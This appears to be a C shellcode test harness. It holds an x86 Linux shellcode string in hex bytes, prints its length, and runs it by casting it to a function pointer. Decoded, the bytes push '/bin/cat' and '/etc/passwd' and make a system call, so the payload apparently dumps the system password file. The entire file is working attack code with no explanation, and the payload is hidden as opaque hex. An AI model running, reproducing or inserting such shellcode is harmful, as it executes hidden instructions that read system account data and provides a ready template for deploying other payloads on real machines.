#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xb8\xff\xff\xff\xff\x40\x99\x8d\x5c\x24\xf4\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x8d\x4b\xf0\x52\x68\x74\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x66\xb8\x2f\x4a\x52\x80\x74\x24\x0c\x07\x51\x53\x89\xe1\x66\x25\x8b\x35\xcd\x80";

main() {

	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;

	ret();

}